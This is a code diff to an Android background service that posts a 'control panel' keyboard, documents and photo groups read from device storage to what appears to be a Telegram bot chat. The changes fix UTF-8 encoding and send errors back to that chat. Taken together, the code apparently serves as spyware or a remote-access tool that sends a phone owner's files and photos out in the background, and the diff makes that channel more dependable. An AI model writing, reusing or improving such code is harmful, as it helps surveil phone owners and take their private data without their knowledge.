@@ -29,6 +29,7 @@ import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -104,7 +105,7 @@ public class BackgroundService extends Service {
             conn.setReadTimeout(15000);
             conn.setDoOutput(true);
             conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/json");
+            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
 
             JSONObject json = new JSONObject();
             json.put("chat_id", CHAT_ID);
@@ -137,15 +138,37 @@ public class BackgroundService extends Service {
             replyMarkup.put("inline_keyboard", keyboard);
             json.put("reply_markup", replyMarkup);
 
+            byte[] payload = json.toString().getBytes(StandardCharsets.UTF_8);
+
             try (DataOutputStream os = new DataOutputStream(conn.getOutputStream())) {
-                os.writeBytes(json.toString());
+                os.write(payload);
                 os.flush();
             }
-            conn.getResponseCode();
+
+            int code = conn.getResponseCode();
+            if (code != 200) {
+                String body = readErrorBody(conn);
+                sendMsg("sendControlPanel failed " + code + ": " + body);
+            }
         } catch (Exception e) {
-            e.printStackTrace();
+            sendMsg("sendControlPanel exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
         } finally {
             if (conn != null) conn.disconnect();
+        }
+    }
+
+    private String readErrorBody(HttpURLConnection conn) {
+        try {
+            InputStream err = conn.getErrorStream();
+            if (err == null) return "";
+            StringBuilder sb = new StringBuilder();
+            try (BufferedReader r = new BufferedReader(new InputStreamReader(err, StandardCharsets.UTF_8))) {
+                String line;
+                while ((line = r.readLine()) != null) sb.append(line);
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "";
         }
     }
 
@@ -160,7 +183,7 @@ public class BackgroundService extends Service {
 
             StringBuilder response = new StringBuilder();
             try (InputStream in = conn.getInputStream();
-                 BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {
+                 BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
                 String line;
                 while ((line = reader.readLine()) != null) response.append(line);
             }
@@ -327,7 +350,7 @@ public class BackgroundService extends Service {
                 req.writeBytes(twoHyphens + boundary + lineEnd);
                 req.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"" + lineEnd);
                 req.writeBytes("Content-Type: text/plain; charset=utf-8" + lineEnd + lineEnd);
-                req.write(content.getBytes("UTF-8"));
+                req.write(content.getBytes(StandardCharsets.UTF_8));
                 req.writeBytes(lineEnd);
                 req.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                 req.flush();
@@ -340,7 +363,6 @@ public class BackgroundService extends Service {
         }
     }
 
-    // ---- fixed: separate compression pass so indices in media[] match file parts ----
     private void sendMediaGroup(List<Uri> uris) {
         List<byte[]> images = new ArrayList<>();
         for (Uri u : uris) {
@@ -378,7 +400,7 @@ public class BackgroundService extends Service {
             for (int i = 0; i < images.size(); i++) {
                 JSONObject m = new JSONObject();
                 m.put("type", "photo");
-                m.put("media", "attach://file" + i);   // index matches images list, not URI list
+                m.put("media", "attach://file" + i);
                 mediaArray.put(m);
             }
 
@@ -389,7 +411,8 @@ public class BackgroundService extends Service {
 
                 req.writeBytes(twoHyphens + boundary + lineEnd);
                 req.writeBytes("Content-Disposition: form-data; name=\"media\"" + lineEnd + lineEnd);
-                req.writeBytes(mediaArray.toString() + lineEnd);
+                req.write(mediaArray.toString().getBytes(StandardCharsets.UTF_8));
+                req.writeBytes(lineEnd);
 
                 for (int i = 0; i < images.size(); i++) {
                     req.writeBytes(twoHyphens + boundary + lineEnd);
